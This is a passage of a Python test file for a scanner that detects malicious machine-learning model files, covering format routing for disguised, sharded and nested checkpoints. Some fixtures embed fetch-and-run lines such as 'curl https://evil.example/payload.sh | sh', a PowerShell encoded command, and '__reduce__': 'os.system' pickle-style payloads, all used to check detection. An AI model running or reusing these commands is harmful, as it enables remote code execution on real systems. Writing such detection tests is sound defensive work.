    monkeypatch.setattr(core_module._registry, "load_scanner_by_id", lambda scanner_id: DummyPreferredScanner)
    monkeypatch.setattr(
        core_module._registry,
        "get_scanner_for_path",
        lambda *args, **kwargs: pytest.fail("preferred scanner path should not use registry fallback"),
    )
    monkeypatch.setattr(core_module, "scan_advanced_large_file", fake_scan_advanced_large_file)

    result = scan_file(
        str(shard),
        config={
            "cache_scan_results": False,
            core_module._SHARD_FAMILY_CACHE_FINGERPRINT_CONFIG_KEY: {
                "members": [
                    {"path": allowed_path, "content_hash": "sha256:inside"},
                    {"path": None, "content_hash": "invalid"},
                    "not-a-member",
                ],
            },
        },
    )

    assert result.scanner_name == "dummy_preferred"
    assert captured_allowed_paths == [[allowed_path]]


def test_directory_scan_reports_incomplete_sharded_model_family_once(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    shards: list[Path] = []
    for shard_index in range(1, 3):
        shard_path = tmp_path / f"model-{shard_index:05d}-of-00003.safetensors"
        shard_path.write_bytes(f"shard-{shard_index}".encode())
        shards.append(shard_path.resolve())
    family_size = sum(shard.stat().st_size for shard in shards)
    calls: list[str] = []

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        calls.append(path)
        return _mock_sharded_scan_result(family_size, missing_shards=1)

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)

    coverage_checks = [check for check in result.checks if check.name == "Sharded Model Coverage Check"]
    assert len(calls) == 1
    assert result.files_scanned == len(shards)
    assert result.bytes_scanned == family_size
    assert len(coverage_checks) == 1
    assert coverage_checks[0].details["missing_shard_count"] == 1


def test_directory_scan_sharded_family_cache_fingerprint_tracks_sibling_shards(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    shards: list[Path] = []
    for shard_index in range(1, 3):
        shard_path = tmp_path / f"model-{shard_index:05d}-of-00002.safetensors"
        shard_path.write_bytes(f"shard-{shard_index}".encode())
        shards.append(shard_path.resolve())
    captured_configs: list[dict[str, Any]] = []

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        captured_configs.append(dict(config or {}))
        return _mock_sharded_scan_result(sum(shard.stat().st_size for shard in shards))

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    core_module.scan_model_directory_or_file(str(tmp_path))
    first_material_config = normalize_material_scan_config(captured_configs[0])
    first_fingerprint = first_material_config[core_module._SHARD_FAMILY_CACHE_FINGERPRINT_CONFIG_KEY]

    shards[1].write_bytes(b"changed-shard-2")
    captured_configs.clear()

    core_module.scan_model_directory_or_file(str(tmp_path))
    second_material_config = normalize_material_scan_config(captured_configs[0])
    second_fingerprint = second_material_config[core_module._SHARD_FAMILY_CACHE_FINGERPRINT_CONFIG_KEY]

    assert {member["path"] for member in first_fingerprint["members"]} == {str(shard) for shard in shards}
    assert first_fingerprint != second_fingerprint


def test_directory_scan_groups_shard_family_without_declared_total(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    shards: list[Path] = []
    for shard_index in range(1, 3):
        shard_path = tmp_path / f"checkpoint_{shard_index}.pt"
        shard_path.write_bytes(f"checkpoint-shard-{shard_index}".encode())
        shards.append(shard_path.resolve())
    captured_configs: list[dict[str, Any]] = []
    calls: list[str] = []

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        calls.append(path)
        captured_configs.append(dict(config or {}))
        return _mock_sharded_scan_result(sum(shard.stat().st_size for shard in shards))

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)

    material_config = normalize_material_scan_config(captured_configs[0])
    fingerprint = material_config[core_module._SHARD_FAMILY_CACHE_FINGERPRINT_CONFIG_KEY]
    assert len(calls) == 1
    assert Path(calls[0]).name in {shard.name for shard in shards}
    assert result.files_scanned == len(shards)
    assert fingerprint["expected_total_shards"] is None
    assert {member["path"] for member in fingerprint["members"]} == {str(shard) for shard in shards}


def test_directory_scan_content_hash_excludes_files_skipped_by_total_size_limit(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_files: list[Path] = []
    for index in range(3):
        model_path = tmp_path / f"model-{index}.safetensors"
        model_path.write_bytes(f"model-{index}".encode())
        model_files.append(model_path.resolve())
    calls: list[str] = []

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        calls.append(path)
        result = ScanResult(scanner_name="safetensors")
        result.bytes_scanned = 2
        result.finish(success=True)
        return result

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(tmp_path), max_total_size=1)

    all_file_hashes = [core_module._calculate_file_hash(str(model_path)) for model_path in model_files]
    scanned_file_hashes = [core_module._calculate_file_hash(path) for path in calls]
    assert len(calls) == 1
    assert result.content_hash == compute_aggregate_hash(scanned_file_hashes)
    assert result.content_hash != compute_aggregate_hash(all_file_hashes)


def test_scan_file_detects_malicious_zip_with_misleading_extension(tmp_path: Path) -> None:
    disguised_zip = tmp_path / "payload.jpg"
    _create_misnamed_zip(disguised_zip, {"payload.pkl": _build_malicious_pickle()})

    result = scan_file(str(disguised_zip))

    assert result.scanner_name == "zip"
    _assert_system_pickle_detected(result, "payload.pkl")


def test_scan_file_routes_malicious_cntk_with_misleading_extension(tmp_path: Path) -> None:
    disguised_cntk = tmp_path / "payload.jpg"
    _write_malicious_cntk(disguised_cntk)

    result = scan_file(str(disguised_cntk))

    assert result.scanner_name == "cntk"
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


def test_scan_file_routes_malicious_lightgbm_with_misleading_extension(tmp_path: Path) -> None:
    disguised_lightgbm = tmp_path / "payload.jpg"
    _write_malicious_lightgbm(disguised_lightgbm)

    result = scan_file(str(disguised_lightgbm))

    assert result.scanner_name == "lightgbm"
    assert any(
        check.name == "Command/Network Correlation Check" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_routes_malicious_lightgbm_with_binary_prelude(tmp_path: Path) -> None:
    disguised_lightgbm = tmp_path / "binary-payload.jpg"
    _write_malicious_lightgbm(disguised_lightgbm)
    disguised_lightgbm.write_bytes(b"\x01opaque tree prelude\x00" + disguised_lightgbm.read_bytes())

    result = scan_file(str(disguised_lightgbm))

    assert result.scanner_name == "lightgbm"
    assert any(
        check.name == "Command/Network Correlation Check" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


@pytest.mark.parametrize("flax_prefix", [b"\x81\xa6params\xc1\x00", b"\x82\xa6params\x80\xc1\x00"])
def test_scan_file_does_not_let_invalid_flax_prefix_mask_malicious_lightgbm(
    tmp_path: Path,
    flax_prefix: bytes,
) -> None:
    disguised_lightgbm = tmp_path / "malformed-flax-prefix.jpg"
    _write_malicious_lightgbm(disguised_lightgbm)
    disguised_lightgbm.write_bytes(flax_prefix + disguised_lightgbm.read_bytes())

    assert file_detection.detect_file_format(str(disguised_lightgbm)) == "lightgbm"
    assert file_detection.detect_file_format_from_magic(str(disguised_lightgbm)) == "lightgbm"
    assert file_detection.detect_file_format_for_skip_filter(str(disguised_lightgbm)) == "lightgbm"

    result = scan_file(str(disguised_lightgbm))

    assert result.scanner_name == "lightgbm"
    assert any(
        check.name == "Command/Network Correlation Check" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


@pytest.mark.parametrize("foreign_format", ["rknn", "torch7", "cntk", "lightgbm"])
def test_scan_file_preserves_foreign_findings_in_flax_content_overlap(tmp_path: Path, foreign_format: str) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    payload = tmp_path / f"overlap-{foreign_format}.jpg"
    if foreign_format == "rknn":
        payload.write_bytes(
            b"RKNN\x01\x00\x00\x00"
            b"notes=cmd.exe /c curl https://evil.example/payload && powershell -enc AAAA\n"
            b"callback=http://198.51.100.5:8080/collect\n"
        )
    elif foreign_format == "torch7":
        payload.write_bytes(
            b"4\n1\n3\nV 1\n13\nnn.Sequential\n"
            b"4\n2\n3\nV 1\n17\ntorch.FloatTensor\n"
            b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
        )
    elif foreign_format == "cntk":
        _write_malicious_cntk(payload)
    else:
        _write_malicious_lightgbm(payload)
    payload.write_bytes(
        payload.read_bytes() + flax_msgpack_scanner.msgpack.packb({"params": {"w": [1, 2, 3]}}, use_bin_type=True)
    )

    result = scan_file(str(payload), config={"cache_scan_results": False})

    assert result.scanner_name == "flax_msgpack"
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
    assert result.bytes_scanned == payload.stat().st_size


def test_scan_file_prefers_strict_cntk_owner_over_inconclusive_flax_probe(tmp_path: Path) -> None:
    payload = tmp_path / "bounded-cntk.jpg"
    _write_malicious_cntk(payload)
    payload.write_bytes(payload.read_bytes() + (b" safe " * (2 * FLAX_MSGPACK_STRUCTURE_READ_BYTES)))

    assert file_detection.detect_file_format(str(payload)) == "cntk"
    assert file_detection.detect_file_format_from_magic(str(payload)) == "cntk"
    assert file_detection.detect_file_format_for_skip_filter(str(payload)) == "cntk"

    result = scan_file(str(payload), config={"cache_scan_results": False})

    assert result.scanner_name == "cntk"
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert "cntk_bounded_read_incomplete" in result.metadata["scan_outcome_reasons"]
    assert "flax_msgpack_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    assert any(check.name == "MessagePack Routing Analysis Incomplete" for check in result.checks)
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


def test_scan_file_preserves_inconclusive_flax_outcome_under_strict_cntk_owner(tmp_path: Path) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    payload = tmp_path / "delayed-flax-cntk.jpg"
    _write_delayed_flax_cntk_overlap(payload)

    assert payload.stat().st_size < 10 * 1024 * 1024
    assert file_detection.detect_file_format(str(payload)) == "cntk"
    assert file_detection.detect_file_format_from_magic(str(payload)) == "cntk"

    result = scan_file(str(payload), config={"cache_scan_results": False})
    aggregate = scan_model_directory_or_file(str(payload), cache_scan_results=False)

    assert result.scanner_name == "cntk"
    assert result.success is False
    assert "cntk_bounded_read_incomplete" not in result.metadata.get("scan_outcome_reasons", [])
    assert "flax_msgpack_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    assert any(check.name == "MessagePack Routing Analysis Incomplete" for check in result.checks)
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_preserves_inconclusive_flax_outcome_for_nested_strict_cntk_owner(tmp_path: Path) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    nested_payload = tmp_path / "delayed-flax-cntk.jpg"
    _write_delayed_flax_cntk_overlap(nested_payload)
    archive = tmp_path / "delayed-flax-cntk.zip"
    _create_misnamed_zip(archive, {"delayed-flax-cntk.jpg": nested_payload.read_bytes()})

    result = scan_file(str(archive), config={"cache_scan_results": False})
    aggregate = scan_model_directory_or_file(str(archive), cache_scan_results=False)

    assert result.scanner_name == "zip"
    assert any(check.name == "MessagePack Routing Analysis Incomplete" for check in result.checks)
    assert "flax_msgpack_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_fails_closed_when_flax_overlap_scanner_is_unavailable(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    payload = tmp_path / "unavailable-overlap.jpg"
    _write_malicious_lightgbm(payload)
    payload.write_bytes(
        payload.read_bytes() + flax_msgpack_scanner.msgpack.packb({"params": {"w": [1, 2, 3]}}, use_bin_type=True)
    )
    original_loader = core_module._registry.load_scanner_by_id

    def load_scanner_by_id(scanner_id: str) -> type[Any] | None:
        if scanner_id == "lightgbm":
            return None
        return original_loader(scanner_id)

    monkeypatch.setattr(core_module._registry, "load_scanner_by_id", load_scanner_by_id)

    result = scan_file(str(payload), config={"cache_scan_results": False})

    assert result.scanner_name == "flax_msgpack"
    assert result.success is False
    check = next(check for check in result.checks if check.name == "Format Detection")
    assert check.details["format"] == "lightgbm"
    assert check.details["preferred_scanner_id"] == "lightgbm"


def test_scan_file_preserves_foreign_findings_in_nested_flax_content_overlap(tmp_path: Path) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    nested_payload = tmp_path / "nested-overlap.jpg"
    _write_malicious_lightgbm(nested_payload)
    nested_payload.write_bytes(
        nested_payload.read_bytes()
        + flax_msgpack_scanner.msgpack.packb({"params": {"w": [1, 2, 3]}}, use_bin_type=True)
    )
    archive = tmp_path / "overlap.zip"
    _create_misnamed_zip(archive, {"nested-overlap.jpg": nested_payload.read_bytes()})

    result = scan_file(str(archive), config={"cache_scan_results": False})

    assert result.scanner_name == "zip"
    assert any(
        check.name == "Command/Network Correlation Check" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


@pytest.mark.parametrize(
    "scanner_config",
    [{"exclude_scanners": ["flax_msgpack"]}, {"scanners": ["lightgbm"]}],
    ids=["excluded-flax", "exact-lightgbm"],
)
def test_scan_file_preserves_selected_lightgbm_findings_in_flax_content_overlap(
    tmp_path: Path,
    scanner_config: dict[str, list[str]],
) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    payload = tmp_path / "selected-overlap.jpg"
    _write_malicious_lightgbm(payload)
    payload.write_bytes(
        payload.read_bytes() + flax_msgpack_scanner.msgpack.packb({"params": {"w": [1, 2, 3]}}, use_bin_type=True)
    )

    result = scan_file(str(payload), config={**scanner_config, "cache_scan_results": False})

    assert result.scanner_name == "lightgbm"
    assert any(
        check.name == "Command/Network Correlation Check" and check.status == CheckStatus.FAILED
        for check in result.checks
    )
    assert any(
        check.name == "Scanner Selection"
        and check.details.get("kind") == "preferred"
        and check.details.get("skipped_scanner_id") == "flax_msgpack"
        for check in result.checks
    )


def test_scan_file_preserves_selected_nested_lightgbm_findings_in_flax_content_overlap(tmp_path: Path) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    nested_payload = tmp_path / "selected-nested-overlap.jpg"
    _write_malicious_lightgbm(nested_payload)
    nested_payload.write_bytes(
        nested_payload.read_bytes()
        + flax_msgpack_scanner.msgpack.packb({"params": {"w": [1, 2, 3]}}, use_bin_type=True)
    )
    archive = tmp_path / "selected-overlap.zip"
    _create_misnamed_zip(archive, {"selected-nested-overlap.jpg": nested_payload.read_bytes()})

    result = scan_file(
        str(archive),
        config={"scanners": ["zip", "lightgbm"], "cache_scan_results": False},
    )

    assert result.scanner_name == "zip"
    assert any(
        check.name == "Command/Network Correlation Check" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_does_not_route_cntk_or_lightgbm_near_matches(tmp_path: Path) -> None:
    cntk_near_match = tmp_path / "cntk-near-match.jpg"
    lightgbm_near_match = tmp_path / "lightgbm-near-match.jpg"
    _write_malicious_cntk(cntk_near_match, include_structure=False)
    _write_malicious_lightgbm(lightgbm_near_match, valid=False)

    assert scan_file(str(cntk_near_match)).scanner_name == "unknown"
    assert scan_file(str(lightgbm_near_match)).scanner_name == "unknown"


@pytest.mark.parametrize("suffix", [".flax", ".orbax", ".jax"])
def test_scan_file_fails_closed_for_msgpack_extensions_when_dependency_is_missing(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    suffix: str,
) -> None:
    checkpoint = tmp_path / f"model{suffix}"
    checkpoint.write_bytes(b"\x81\xa6params\x81\xa1w\x93\x01\x02\x03")
    monkeypatch.setattr(flax_msgpack_scanner, "HAS_MSGPACK", False)

    result = scan_file(str(checkpoint))

    assert result.scanner_name == "flax_msgpack"
    assert result.success is False
    library_check = next(check for check in result.checks if check.name == "msgpack Library Check")
    assert library_check.message == "msgpack library not installed - cannot analyze Flax checkpoints"

    aggregate = scan_model_directory_or_file(str(checkpoint), cache_scan_results=False)
    assert aggregate.success is True
    assert core_module.determine_exit_code(aggregate) == 1


def test_scan_file_does_not_route_generic_msgpack_suffix_near_match_without_dependency(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    checkpoint = tmp_path / "model.flaxy"
    checkpoint.write_bytes(b"\x81\xa5state\x81\xa8selected\xc3")
    monkeypatch.setattr(flax_msgpack_scanner, "HAS_MSGPACK", False)

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})

    assert result.scanner_name == "unknown"
    assert result.success is True


def test_scan_file_fails_closed_for_renamed_structural_msgpack_without_dependency(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    checkpoint = tmp_path / "model.jpg"
    checkpoint.write_bytes(b"\x81\xa6params\x81\xa1w\x93\x01\x02\x03")
    monkeypatch.setattr(flax_msgpack_scanner, "HAS_MSGPACK", False)
    monkeypatch.setitem(sys.modules, "msgpack", None)

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})

    assert result.scanner_name == "flax_msgpack"
    assert result.success is False
    assert any(check.name == "msgpack Library Check" for check in result.checks)


def test_scan_file_routes_renamed_flax_stream_with_malicious_trailing_object(tmp_path: Path) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    checkpoint = tmp_path / "stream.jpg"
    checkpoint.write_bytes(
        flax_msgpack_scanner.msgpack.packb({"params": {"w": [1, 2, 3]}}, use_bin_type=True)
        + flax_msgpack_scanner.msgpack.packb({"__reduce__": "os.system"}, use_bin_type=True)
    )

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})

    assert result.scanner_name == "flax_msgpack"
    assert result.success is False
    assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)


def test_scan_file_routes_renamed_flax_stream_with_later_checkpoint_object(tmp_path: Path) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    checkpoint = tmp_path / "stream-later-root.jpg"
    checkpoint.write_bytes(
        flax_msgpack_scanner.msgpack.packb({"metadata": {"producer": "flax"}}, use_bin_type=True)
        + flax_msgpack_scanner.msgpack.packb(
            {"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"},
            use_bin_type=True,
        )
    )

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})

    assert result.scanner_name == "flax_msgpack"
    assert result.success is False
    assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)


@pytest.mark.parametrize("leading_scalar", [None, 123, 91], ids=["nil", "json-object-byte", "json-array-byte"])
def test_scan_file_routes_renamed_flax_stream_with_leading_scalar_object(
    tmp_path: Path,
    leading_scalar: int | None,
) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    checkpoint = tmp_path / f"stream-leading-scalar-{leading_scalar}.jpg"
    checkpoint.write_bytes(
        flax_msgpack_scanner.msgpack.packb(leading_scalar, use_bin_type=True)
        + flax_msgpack_scanner.msgpack.packb(
            {"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"},
            use_bin_type=True,
        )
    )

    assert file_detection.detect_file_format(str(checkpoint)) == "flax_msgpack"
    assert file_detection.detect_file_format_from_magic(str(checkpoint)) == "flax_msgpack"
    assert file_detection.detect_file_format_for_skip_filter(str(checkpoint)) == "flax_msgpack"

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})

    assert result.scanner_name == "flax_msgpack"
    assert result.success is False
    assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)


@pytest.mark.parametrize("leading_scalar", [123, 91], ids=["json-object-byte", "json-array-byte"])
def test_scan_file_routes_nested_renamed_flax_stream_with_json_delimiter_scalar(
    tmp_path: Path,
    leading_scalar: int,
) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    nested_payload = flax_msgpack_scanner.msgpack.packb(
        leading_scalar, use_bin_type=True
    ) + flax_msgpack_scanner.msgpack.packb(
        {"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"},
        use_bin_type=True,
    )
    archive = tmp_path / f"nested-leading-scalar-{leading_scalar}.zip"
    _create_misnamed_zip(archive, {"payload.jpg": nested_payload})

    result = scan_file(str(archive), config={"cache_scan_results": False})

    assert result.scanner_name == "zip"
    assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)


def test_scan_file_does_not_raise_for_deep_json_array_near_match(tmp_path: Path) -> None:
    payload = tmp_path / "deep-json-array.jpg"
    payload.write_bytes((b"[" * 2000) + b"0" + (b"]" * 2000))

    assert file_detection.detect_file_format(str(payload)) == "unknown"
    assert file_detection.detect_file_format_from_magic(str(payload)) == "unknown"
    assert file_detection.detect_file_format_for_skip_filter(str(payload)) == "unknown"

    direct_result = scan_file(str(payload), config={"cache_scan_results": False})
    archive = tmp_path / "deep-json-array.zip"
    _create_misnamed_zip(archive, {"payload.jpg": payload.read_bytes()})
    nested_result = scan_file(str(archive), config={"cache_scan_results": False})

    assert direct_result.scanner_name == "unknown"
    assert direct_result.success is True
    assert nested_result.scanner_name == "zip"
    assert nested_result.success is True


def test_scan_file_fails_closed_for_renamed_flax_stream_with_scalar_padding_past_analysis_limit(tmp_path: Path) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    checkpoint = tmp_path / "stream-scalar-padding.jpg"
    checkpoint.write_bytes(
        flax_msgpack_scanner.msgpack.packb(None, use_bin_type=True) * 4097
        + flax_msgpack_scanner.msgpack.packb(
            {"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"},
            use_bin_type=True,
        )
    )

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})
    aggregate = scan_model_directory_or_file(str(checkpoint), cache_scan_results=False)

    assert result.scanner_name == "flax_msgpack"
    assert result.success is False
    assert any("Msgpack stream object count exceeds configured limit" in issue.message for issue in result.issues)
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_routes_renamed_flax_state_wrapper_with_malicious_attribute(tmp_path: Path) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    checkpoint = tmp_path / "state-wrapper.jpg"
    checkpoint.write_bytes(
        flax_msgpack_scanner.msgpack.packb(
            {"state": {"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"}},
            use_bin_type=True,
        )
    )

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})

    assert result.scanner_name == "flax_msgpack"
    assert result.success is False
    assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)


@pytest.mark.parametrize("suffix", [".jpg", ".flax"])
@pytest.mark.parametrize(
    "embedded_bytes",
    [
        b"\n4\n1\n3\nV 1\n13\nnn.Sequential\n4\n2\n3\nV 1\n17\ntorch.FloatTensor\n",
        (
            b"\x08\x01\x12\x11\x0a\x07version\x12\x06\x08\x01\x10\x03(\x02\x12\x09\x0a\x03uid\x12\x02ab"
            b" CompositeFunction primitive_functions "
        ),
        (
            b"\x00tree=0\nversion=v4\nnum_class=1\nnum_tree_per_iteration=1\nmax_feature_idx=2\n"
            b"tree_sizes=12\nnum_leaves=2\nsplit_feature=0\nleaf_value=0.1 0.2\n"
        ),
    ],
)
def test_scan_file_keeps_flax_analysis_when_payload_contains_embedded_format_signature(
    tmp_path: Path,
    suffix: str,
    embedded_bytes: bytes,
) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    checkpoint = tmp_path / f"embedded{suffix}"
    checkpoint.write_bytes(
        flax_msgpack_scanner.msgpack.packb(
            {"params": {"blob": embedded_bytes}, "__reduce__": "os.system"},
            use_bin_type=True,
        )
    )

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})

    assert result.scanner_name == "flax_msgpack"
    assert result.success is False
    assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)


def test_scan_file_routes_malicious_explicit_flax_suffix_to_flax_scanner(tmp_path: Path) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    checkpoint = tmp_path / "malicious.flax"
    checkpoint.write_bytes(
        flax_msgpack_scanner.msgpack.packb({"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"}, use_bin_type=True)
    )

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})

    assert result.scanner_name == "flax_msgpack"
    assert result.success is False
    assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)


@pytest.mark.parametrize("suffix", [".ckpt", ".checkpoint", ".orbax-checkpoint"])
def test_scan_file_routes_msgpack_checkpoint_overlap_suffixes_to_flax_scanner(tmp_path: Path, suffix: str) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    checkpoint = tmp_path / f"malicious{suffix}"
    checkpoint.write_bytes(
        flax_msgpack_scanner.msgpack.packb({"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"}, use_bin_type=True)
    )

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})

    assert result.scanner_name == "flax_msgpack"
    assert result.success is False
    assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)


def test_scan_file_routes_large_malicious_renamed_flax_msgpack_with_later_root_to_flax_scanner(tmp_path: Path) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    checkpoint = tmp_path / "malicious.jpg"
    checkpoint.write_bytes(
        flax_msgpack_scanner.msgpack.packb(
            {
                "metadata": "x" * (FLAX_MSGPACK_STRUCTURE_READ_BYTES + 100),
                "params": {"w": [1, 2, 3]},
                "__reduce__": "os.system",
            },
            use_bin_type=True,
        )
    )

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})

    assert result.scanner_name == "flax_msgpack"
    assert result.success is False
    assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)


@pytest.mark.parametrize("wrapped", [False, True], ids=["direct-root", "state-wrapper-root"])
def test_scan_file_analyzes_renamed_flax_after_confirmed_root_exceeds_routing_budget(
    tmp_path: Path,
    wrapped: bool,
) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    params = {f"f{i}": i for i in range(2100)}
    checkpoint_state: dict[str, object] = {"params": params} if not wrapped else {"state": {"params": params}}
    checkpoint_state["__reduce__"] = "os.system"
    checkpoint = tmp_path / f"confirmed-root-{wrapped}.jpg"
    checkpoint.write_bytes(flax_msgpack_scanner.msgpack.packb(checkpoint_state, use_bin_type=True))

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})

    assert result.scanner_name == "flax_msgpack"
    assert not any(check.name == "MessagePack Routing Analysis Limit" for check in result.checks)
    assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)


@pytest.mark.parametrize("wrapped", [False, True], ids=["direct-root", "state-wrapper-root"])
def test_scan_file_analyzes_nested_renamed_flax_after_confirmed_root_exceeds_routing_budget(
    tmp_path: Path,
    wrapped: bool,
) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    params = {f"f{i}": i for i in range(2100)}
    checkpoint_state: dict[str, object] = {"params": params} if not wrapped else {"state": {"params": params}}
    checkpoint_state["__reduce__"] = "os.system"
    archive = tmp_path / f"confirmed-root-{wrapped}.zip"
    _create_misnamed_zip(
        archive,
        {"payload.jpg": flax_msgpack_scanner.msgpack.packb(checkpoint_state, use_bin_type=True)},
    )

    result = scan_file(str(archive), config={"cache_scan_results": False})

    assert result.scanner_name == "zip"
    assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)


def test_scan_file_fails_closed_for_renamed_msgpack_routing_probe_limit(tmp_path: Path) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    checkpoint = tmp_path / "ambiguous.jpg"
    large_metadata: dict[str, object] = {f"field{i}": i for i in range(2100)}
    large_metadata["blob"] = "x" * (FLAX_MSGPACK_STRUCTURE_READ_BYTES + 100)
    checkpoint.write_bytes(
        flax_msgpack_scanner.msgpack.packb(
            {"metadata": large_metadata, "state": {"selected": True}},
            use_bin_type=True,
        )
    )

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})
    aggregate = scan_model_directory_or_file(str(checkpoint), cache_scan_results=False)

    assert result.scanner_name == "flax_msgpack"
    assert result.success is False
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert "flax_msgpack_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    limit_check = next(check for check in result.checks if check.name == "MessagePack Routing Analysis Incomplete")
    assert (
        limit_check.message
        == "Flax MessagePack analysis incomplete because bounded routing inspection could not complete"
    )
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_fails_closed_when_renamed_msgpack_routing_read_cannot_complete(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    checkpoint = tmp_path / "unavailable.jpg"
    checkpoint.write_bytes(b"\x81\xa6params\x81\xa1w\x93\x01\x02\x03")
    monkeypatch.setattr(file_detection, "_probe_flax_msgpack_checkpoint_file", lambda _path: None)

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})
    aggregate = scan_model_directory_or_file(str(checkpoint), cache_scan_results=False)

    assert result.scanner_name == "flax_msgpack"
    assert result.success is False
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert "flax_msgpack_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_fails_closed_for_small_renamed_msgpack_routing_probe_limit(tmp_path: Path) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
